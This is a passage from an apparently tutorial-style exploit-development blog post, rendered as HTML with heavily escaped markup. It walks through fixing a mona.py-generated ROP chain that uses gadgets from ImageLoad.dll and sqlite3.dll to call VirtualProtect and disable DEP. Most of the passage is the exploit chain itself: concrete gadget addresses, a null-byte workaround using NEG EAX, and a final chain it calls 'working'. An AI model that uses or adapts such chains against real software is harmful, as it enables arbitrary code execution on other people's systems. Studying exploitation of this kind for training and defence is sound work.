</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>  <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'><span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&amp;lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Awesome, all hard work has been done for us! Well, not all of it actually - have a look at this line:</p>

<pre><code>0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
</code></pre>

<p>Oops, mona found all but one gadget that we need for a successful ROP chain&hellip; but it&rsquo;s not the end of the world, let&rsquo;s find it ourselves! <em>And that&rsquo;s where the real fun begins.</em></p>

<p>Looking through all available gadgets that mona found, I really couldn&rsquo;t find anything simple that would put value of 201 to EBX. There were some <code>POP EBX</code> instructions available, but that was not very helpful. Why? 201 in hex contains <code>\x00</code>, which is a bad character and we can&rsquo;t use it!</p>

<p>I kept poking around and decided that I will probably need to put the value into EBX through some other register that I can easily populate with whatever value I want (specifically 201). I decided to focus on EAX.</p>

<p>With couple simple gadgets, I had 201 in EAX in no time:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>      <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>      <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>      <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &amp;lsquo;-201&amp;rsquo;</span>
</span><span class='line'>      <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Okay, how can I put it in the EBX now? Again, after a lot of searching, I couldn&rsquo;t find anything straight forward. Searched a bit more and stumbled across this:</p>

<pre><code>      0x1001da09:  # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
</code></pre>

<p>Cool, so it will move EAX into EBX - exactly what I wanted! But it also does couple other things afterwards that may be problematic&hellip; let&rsquo;s look into it further.</p>

<p>In simple terms, what happens next is that we are saving the address of <code>ESP+C</code> (4th argument on the stack) into <code>EAX</code> and then, we increment the value pointed to by the address stored in <code>EAX</code>. This means that for it to work correctly, we need to have a writeable location in the memory so we can <code>INC</code> the value pointed by the address in <code>EAX</code>.</p>

<p>Luckily, looking at the generated part of the chain, mona already found it for us!</p>

<pre><code>      0x61c73281,  # &amp;Writable location [sqlite3.dll]
</code></pre>

<p>Awesome, now we just need to do a bit of shuffling around with ESP to compensate for the first gadget and we should be fine! I ended up coming up with the following snippet:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>      <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well&amp;hellip;)</span>
</span><span class='line'>      <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="c"># Other instructions to execute after above gadget - mona found those already...</span>
</span><span class='line'>  <span class="c"># (This is just to show that gadget above picks 4th next address to put into EAX)</span>
</span><span class='line'>  <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>  <span class="mh">0xDEADBEEF</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]   </span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, last thing to remember is that the gadgets above will mess up our EAX register, which is a problem if we decide to insert them exactly where mona suggested. Why? Because one of the first things the suggested ROP chain does is that it sets EAX to an expected value. If we corrupt it later with our gadgets, call to <code>VirtualAlloc</code> won&rsquo;t have right arguments and the function will fail.</p>

<p>To overcome this, simply change the order and do our EBX magic as a first thing in the ROP chain. Setting up EAX will follow and we won&rsquo;t be corrupting anything.</p>

<p>Putting it all together, that&rsquo;s the final, working ROP chain:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">ROP</span> <span class="n">chain</span> <span class="n">generated</span> <span class="k">with</span> <span class="n">mona</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span> <span class="n">www</span><span class="o">.</span><span class="n">corelan</span><span class="o">.</span><span class="n">be</span> <span class="p">(</span><span class="ow">and</span> <span class="n">slightly</span> <span class="n">fixed</span> <span class="n">by</span> <span class="nd">@TheKnapsy</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Essentially</span><span class="p">,</span> <span class="n">use</span> <span class="n">PUSHAD</span> <span class="n">to</span> <span class="nb">set</span> <span class="nb">all</span> <span class="n">parameters</span> <span class="ow">and</span> <span class="n">call</span> <span class="n">VirtualProtect</span><span class="p">()</span> <span class="n">to</span> <span class="n">disable</span> <span class="n">DEP</span><span class="o">.&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>  <span class="c"># Generate value of 201 in EAX</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0xFFFFFDFF</span><span class="p">,</span>  <span class="c"># Value of &#39;-201&#39;</span>
</span><span class='line'>  <span class="mh">0x100231d1</span><span class="p">,</span>  <span class="c"># NEG EAX # RETN [ImageLoad.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Put EAX into EBX (other unneccessary stuff comes with this gadget as well...)</span>
</span><span class='line'>  <span class="mh">0x1001da09</span><span class="p">,</span>  <span class="c"># ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Carry on with the ROP as generated by mona.py</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c832d0</span><span class="p">,</span>  <span class="c"># ptr to &amp;amp;VirtualProtect() [IAT sqlite3.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Compensate for the ADD EBX,EAX gadget above, jump over 1 address, which is a dummy writeable location</span>
</span><span class='line'>  <span class="c"># used solely by this the remaining part of the above gadget (it doesn&#39;t really do anything for us)</span>
</span><span class='line'>  <span class="mh">0x1001281a</span><span class="p">,</span>  <span class="c"># ADD ESP,4 # RETN [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># And carry on further as generated by mona.py</span>
</span><span class='line'>  <span class="mh">0x1002248c</span><span class="p">,</span>  <span class="c"># MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c18d81</span><span class="p">,</span>  <span class="c"># XCHG EAX,EDI # RETN [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x1001d626</span><span class="p">,</span>  <span class="c"># XOR ESI,ESI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10021a3e</span><span class="p">,</span>  <span class="c"># ADD ESI,EDI # RETN 0x00 [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x10013ad6</span><span class="p">,</span>  <span class="c"># POP EBP # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c227fa</span><span class="p">,</span>  <span class="c"># &amp;amp; push esp # ret  [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x10022c4c</span><span class="p">,</span>  <span class="c"># XOR EDX,EDX # RETN [ImageLoad.dll] </span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># Now bunch of ugly increments... may need to look for something nicer, but hey - it works!</span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x61c066be</span><span class="p">,</span>  <span class="c"># INC EDX # ADD CL,CL # RETN [sqlite3.dll] </span>
</span><span class='line'>  <span class="mh">0x1001b4f6</span><span class="p">,</span>  <span class="c"># POP ECX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x61c73281</span><span class="p">,</span>  <span class="c"># &amp;amp;Writable location [sqlite3.dll]</span>
</span><span class='line'>  <span class="mh">0x100194b3</span><span class="p">,</span>  <span class="c"># POP EDI # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x1001a858</span><span class="p">,</span>  <span class="c"># RETN (ROP NOP) [ImageLoad.dll]</span>
</span><span class='line'>  <span class="mh">0x10015442</span><span class="p">,</span>  <span class="c"># POP EAX # RETN [ImageLoad.dll] </span>
</span><span class='line'>  <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c"># nop</span>
</span><span class='line'>  <span class="mh">0x100240c2</span><span class="p">,</span>  <span class="c"># PUSHAD # RETN [ImageLoad.dll] </span>
